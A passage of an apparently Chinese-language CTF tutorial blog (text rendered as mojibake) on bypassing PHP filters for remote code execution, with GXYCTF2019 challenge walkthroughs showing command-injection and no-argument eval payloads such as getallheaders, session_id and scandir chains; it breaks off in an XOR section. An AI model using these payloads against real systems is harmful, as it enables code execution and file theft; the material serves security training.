alt="image-20221008212308275"></p><p><strong>ä¸€ä¸ªå°å°çš„ä¾‹é¢˜</strong></p><h2 id="GXYCTF2019-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping"></a>[GXYCTF2019]Ping Ping</h2><p>æç¤º&#x2F;?ip&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;ls</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082242873.png" alt="image-20221008224212832"></p><p>è¯»å–flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;cat flag.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210071554412.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¯»å–index.phpï¼Œç©ºæ ¼ç”¨<code>$IFS$1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;cat$IFS$1index.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210072018448.png" alt="image-20221007201812408"></p><p>æ–¹æ³•ä¸€:å­—ç¬¦ä¸²æ‹¼æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210071554411.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ³•äºŒ:å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;<span class="built_in">cat</span>$IFS<span class="variable">$1</span>`<span class="built_in">ls</span>`</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç ï¼Œè·å¾—flag</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082243753.png" alt="image-20221008224333709"></p><h1 id="ç¯å¢ƒå˜é‡å–å€¼rce"><a href="#ç¯å¢ƒå˜é‡å–å€¼rce" class="headerlink" title="ç¯å¢ƒå˜é‡å–å€¼rce"></a>ç¯å¢ƒå˜é‡å–å€¼rce</h1><p>Linuxä¸‹é»˜è®¤å­˜åœ¨ä¸€äº›ç¯å¢ƒå˜é‡ï¼Œå¯é€šè¿‡envæŸ¥çœ‹</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082137603.png" alt="image-20221008213713529"></p><p>é€šè¿‡æˆªå–å¯è·å¾—ç‰¹å®šå­—ç¬¦</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082139149.png" alt="image-20221008213918093"></p><p>æ¯”å¦‚æ¯”è¾ƒé‡è¦çš„ç®¡é“ç¬¦<code>|</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082241804.png" alt="image-20221008224145767"></p><p>å†å¦‚<code>cat</code></p><p>è¿™æ ·å°±æ‹¿åˆ°äº†<code>cat</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082142228.png" alt="image-20221008214220186"></p><p>æˆåŠŸæ‰§è¡Œå‘½ä»¤</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082143061.png" alt="image-20221008214329018"></p><p>æ­¤å¤–ï¼Œè¿˜å¯ä»¥é…åˆä¸Šé¢æ‰€è¯´åˆ°çš„ç¼–ç è·å–ä¸€äº›ç‰¹æ®Šå­—ç¬¦</p><h1 id="æ— å‚æ•°rce"><a href="#æ— å‚æ•°rce" class="headerlink" title="æ— å‚æ•°rce"></a>æ— å‚æ•°rce</h1><p>åŸºæœ¬ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>(?R)</code>è¡¨ç¤ºå¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œä¹Ÿå°±æ˜¯phpçš„<a href="https://www.php.net/manual/zh/regexp.reference.recursive.php">é€’å½’æ¨¡å¼</a></p><p>è¯¥æ­£åˆ™ï¼Œæ­£æ˜¯æ— å‚æ•°å‡½æ•°çš„æ ¡éªŒï¼Œåªå…è®¸æ‰§è¡Œå¦‚ä¸‹æ ¼å¼å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a();</span><br><span class="line">a(b());</span><br><span class="line">a(b(c()));</span><br></pre></td></tr></table></figure><p><strong>ç›¸å…³å‡½æ•°</strong></p><p>è¯»æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure><p>å…¶ä»–å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>()</span><br><span class="line"><span class="title function_ invoke__">getenv</span>() <span class="comment">//è·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">array_rand</span>() <span class="comment">//ä»æ•°ç»„ä¸­å–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªéšæœºçš„å•å…ƒï¼Œå¹¶è¿”å›éšæœºæ¡ç›®çš„ä¸€ä¸ªæˆ–å¤šä¸ªé”®ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">array_flip</span>() <span class="comment">//array_flip()è¿”å›ä¸€ä¸ªåè½¬åçš„arrayï¼Œä¾‹å¦‚arrayä¸­çš„é”®åå˜æˆäº†å€¼ï¼Œè€Œarrayä¸­çš„å€¼æˆäº†é”®åã€‚</span></span><br><span class="line"><span class="title function_ invoke__">getallheaders</span>() <span class="comment">//è·å–http headerä¿¡æ¯(ä¸­é—´ä»¶å¿…é¡»ä¸ºapache)</span></span><br><span class="line"><span class="title function_ invoke__">get_defined_vars</span>() <span class="comment">//è·å–å…¨å±€å˜é‡</span></span><br><span class="line"><span class="title function_ invoke__">session_id</span>() <span class="comment">//session_id()å¯ä»¥ç”¨æ¥è·å–/è®¾ç½®å½“å‰ä¼šè¯IDã€‚</span></span><br><span class="line"><span class="title function_ invoke__">scandir</span>() <span class="comment">//éå†ç›®å½•</span></span><br><span class="line"><span class="title function_ invoke__">getcwd</span>() <span class="comment">//è·å–å½“å‰ç›®å½•</span></span><br><span class="line"><span class="title function_ invoke__">dirname</span>() <span class="comment">//è¿”å›ä¸Šçº§ç›®å½•</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>() <span class="comment">//æ›´æ”¹å½“å‰ç›®å½•</span></span><br><span class="line"><span class="title function_ invoke__">localeconv</span>() <span class="comment">//è¿”å›ä¸€ä¸ªåŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">current</span>() <span class="comment">//è¾“å‡ºæ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼</span></span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>() <span class="comment">//å°†æ•°ç»„è¿›è¡Œå€’åº</span></span><br><span class="line"><span class="title function_ invoke__">next</span>() <span class="comment">//å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h3><p>æ‰“å°å‡ºæ‰€æœ‰httpè¯·æ±‚å¤´ä¿¡æ¯ï¼Œéœ€apache2ç¯å¢ƒ</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081131687.png" alt="image-20221008113125635"></p><p>æ„é€ æ¶æ„ä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081129289.png" alt="image-20221008112937236"></p><p>åˆ©ç”¨end()å°†ç»“æœä¸­çš„æ¶æ„ä»£ç å–å‡ºå¹¶åˆ©ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(end(getallheaders()));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081130259.png" alt="image-20221008113046202"></p><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p>ç›¸è¾ƒäºgetallheaders()çš„å±€é™æ€§ï¼Œæ˜¾ç„¶get_defined_vars()çš„ä½¿ç”¨æ›´å¹¿æ³›</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081145499.png" alt="image-20221008114558462"></p><p>ä»¥æ•°ç»„å½¢å¼æ‰“å°å‡ºæ‰€æœ‰å…¨å±€å˜é‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span></span><br><span class="line"><span class="variable">$_POST</span></span><br><span class="line"><span class="variable">$_FILES</span></span><br><span class="line"><span class="variable">$_COOKIE</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>()));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081149429.png" alt="image-20221008114903386"></p><p>åˆ©ç”¨æ–¹å¼ä¹Ÿå°±å‘¼ä¹‹æ¬²å‡º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;test=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081152214.png" alt="image-20221008115213161"></p><h3 id="session-id"><a href="#session-id" class="headerlink" title="session_id"></a>session_id</h3><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081155600.png" alt="image-20221008115548563"></p><p>session_id()çš„ä½œç”¨å°±æ˜¯è·å–å½“å‰ä¼šè¯çš„ID,ä¹Ÿå°±æ˜¯cookieä¸­çš„phpsessionçš„å€¼ï¼Œé€šè¿‡æ„é€ PHPSESSIDä¸ºæ¶æ„ä»£ç æ‰§è¡Œå‘½ä»¤<br>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œphpsessionä¸­åªå…è®¸å‡ºç° a-z A-Z 0-9 , - ç­‰å­—ç¬¦ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥æ’å…¥æ¶æ„ä»£ç ï¼Œéœ€è¦å…ˆå°†å…¶è¿›è¡Œ16è¿›åˆ¶ç¼–ç åå†æ’å…¥ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081159770.png" alt="image-20221008115914731"></p><p>æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081159594.png" alt="image-20221008115944539"></p><h2 id="è¯»æ–‡ä»¶"><a href="#è¯»æ–‡ä»¶" class="headerlink" title="è¯»æ–‡ä»¶"></a>è¯»æ–‡ä»¶</h2><p>array_rand()é…åˆarray_flip()è·å–æ•°ç»„å€¼</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081203722.png" alt="image-20221008120313683"></p><p>current()é…åˆlocaleconv()è·å–<code>.</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>());</span><br><span class="line">    </span><br><span class="line"><span class="comment">//output:&#x27;.&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(.));</span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶(è¿‡æ»¤<code>.</code>)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p><strong>å–å½“å‰ç›®å½•ä¸‹æŒ‡å®šæ–‡ä»¶(éœ€çˆ†ç ´)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p><strong>è¯»æŒ‡å®šæ–‡ä»¶(éœ€çˆ†ç ´)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªå°ä¾‹é¢˜</p><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p><strong>.git</strong>æ³„éœ²ï¼Œ<strong>Githack</strong>æ¢å¤ï¼Œå¾—åˆ°<strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†ä¼ªåè®®çš„æ— å‚æ•°rce</p><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><p><strong>session_id()</strong></p><p>å› ä¸ºè¿‡æ»¤äº†<strong>hex</strong>å’Œ<strong>bin</strong>ï¼Œæ‰€ä»¥å°±æ²¡åŠæ³•ä½¿ç”¨<strong>hex2bin</strong>è¿›è¡Œåå…­è¿›åˆ¶è§£ç ï¼Œä¸èƒ½ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†å‘Šè¯‰äº†flagåœ¨flag.phpé‡Œé¢ï¼Œæ‰€ä»¥å¯ç›´æ¥è¯»å–flag.php</p><p>å¯åˆ©ç”¨çš„å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br></pre></td></tr></table></figure><p>ç”¨burpæˆªåŒ…å°†sessionæ”¹æˆå¦‚ä¸‹ï¼š<code>PHPSESSID:payload</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081205728.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p><strong>getcwd()<strong>å‡½æ•°è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨</strong>localeconv()</strong> å‡½æ•°å’Œ**current()**å‡½æ•°æ¥ä»£æ›¿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//è¿”å›&#x27;.&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥ç»§ç»­ä½¿ç”¨**scandir()**äº†</p><p>æŸ¥çœ‹å½“å‰ç›®å½•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081205676.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‘ç°flag.phpç´¢å¼•ä¸º3</p><h4 id="tips1"><a href="#tips1" class="headerlink" title="tips1"></a>tips1</h4><p>ä½¿ç”¨**array_rand()**å‡½æ•°</p><p>ä½†æ˜¯å®ƒå–å‡ºçš„æ˜¯æ•°ç»„çš„é”®ï¼Œå¯ä½¿ç”¨<strong>array_flip()å‡½æ•°</strong>ï¼ŒæŠŠé”®ä¸å€¼äº¤æ¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copy?exp=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081208098.png" alt="image-20221008120850059"></p><p>è¯»å–flagæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082244287.png" alt="image-20221008224433228"></p><h4 id="tips2"><a href="#tips2" class="headerlink" title="tips2"></a>tips2</h4><p>ä½¿ç”¨<code>array_reverse()</code>å‡½æ•°å’Œ<code>next()</code>å‡½æ•°ï¼Œç”¨<code>array_reverse()</code>å‡½æ•°å°†æ•°ç»„è¿›è¡Œ<strong>å€’åº</strong>ï¼Œç„¶åç”¨<code>next()</code>å‡½æ•°æŒ‡å‘ç´¢å¼•<code>1</code>å³<code>flag.php</code></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081205725.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="æ— å­—æ¯æ•°å­—rce"><a href="#æ— å­—æ¯æ•°å­—rce" class="headerlink" title="æ— å­—æ¯æ•°å­—rce"></a>æ— å­—æ¯æ•°å­—rce</h1><p>åŸºæœ¬ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="php5å’Œphp7ä¸­çš„assert-å‡½æ•°"><a href="#php5å’Œphp7ä¸­çš„assert-å‡½æ•°" class="headerlink" title="php5å’Œphp7ä¸­çš„assert()å‡½æ•°"></a>php5å’Œphp7ä¸­çš„assert()å‡½æ•°</h2><p><strong>è¯·æ³¨æ„</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.åœ¨PHP5ä¸­,assert()æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå¯ä»¥ç”¨å½¢å¦‚`$a=assert;$a()`è¿™æ ·çš„å½¢å¼æ¥æ‰§è¡Œä»£ç ã€‚ä½†åœ¨PHP7ä¸­,å®˜æ–¹å¯¹assert()å‡½æ•°è¿›è¡Œäº†æ›´æ”¹,è®©å…¶å˜æˆäº†å’Œeval()ä¸€æ ·çš„è¯­è¨€ç»“æ„,ä¸å†æ”¯æŒä¸Šé¢é‚£ç§è°ƒç”¨æ–¹æ³•ã€‚</span><br><span class="line"></span><br><span class="line">2.PHP5ä¸æ”¯æŒ($a)()è¿™ç§è°ƒç”¨æ–¹å¼,å½¢å¦‚&#x27;phpinfo&#x27;();ä½†PHP7æ”¯æŒã€‚</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081716713.png" alt="image-20221008171657662"></p><h2 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h2><p>PHPä¸­ï¼Œä¸¤ä¸ªå˜é‡çš„å€¼è¿›è¡Œå¼‚æˆ–æ—¶ï¼Œä¼šå…ˆå°†ä¸¤ä¸ªå˜é‡çš„å€¼è½¬æ¢ä¸ºASCIIï¼Œå†å°†ASCIIè½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°æ®ï¼Œå¯¹ä¸¤å¯¹äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œå¼‚æˆ–ï¼Œå¼‚æˆ–å®Œï¼Œå†å°†ç»“æœè½¬ä¸ºASCIIï¼Œæœ€åå°†ASCIIè½¬ä¸ºå­—ç¬¦ä¸²ï¼Œå³ä¸ºæœ€ç»ˆç»“æœã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;1&#x27;</span>^<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">output: S</span></span><br><span class="line"><span class="comment">(1)</span></span><br><span class="line"><span class="comment">1çš„ASCIIå€¼ï¼š49</span></span><br><span class="line"><span class="comment">bçš„ASCIIå€¼ï¼š98</span></span><br><span class="line"><span class="comment">(2)</span></span><br><span class="line"><span class="comment">65è½¬ä¸ºäºŒè¿›åˆ¶ï¼š0110001</span></span><br><span class="line"><span 